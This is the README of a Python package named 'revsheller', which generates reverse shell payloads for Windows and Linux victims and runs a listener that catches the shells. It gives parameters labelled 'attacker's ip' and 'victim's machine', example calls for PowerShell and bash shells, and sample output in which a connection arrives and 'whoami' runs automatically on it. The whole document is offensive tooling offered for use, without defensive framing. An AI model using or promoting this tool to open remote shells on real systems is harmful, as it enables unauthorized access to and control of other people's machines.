# revsheller - pip revsheller package

Easy to generate reverse shells and build a server.

Note: This package is only for Linux or unix like system.

# How to install

Take it easy, just a pip.

# How to use

## To create reverse shells

```
>>> import revsheller as rev
>>> rev.generate(os, mode, ip, port=4444, sh=None, nc_path=None)
```

os - windows / linux

mode - nc:netcat / sh:shell / powershell

ip - attacker's ip address

port - attacker's port

sh - shell of victim's machine, not required

nc_path - netcat path on victim's machine, not required

### Example for windows

```
>>> rev.generate('windows', 'powershell', '127.0.0.1', 4444)
```

### Example for linux / unix

```
>>> rev.generate('linux', 'sh', '127.0.0.1', 4444, sh='/bin/bash')
```

## To wait a connection

```
>>> revsheller.wait_for_connection(4444)
listening on [any] 4444 ...
```

To run a command automaticaly when get response

```
>>> revsheller.wait_for_connection(4444, 'whoami')
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54364
ayato
```

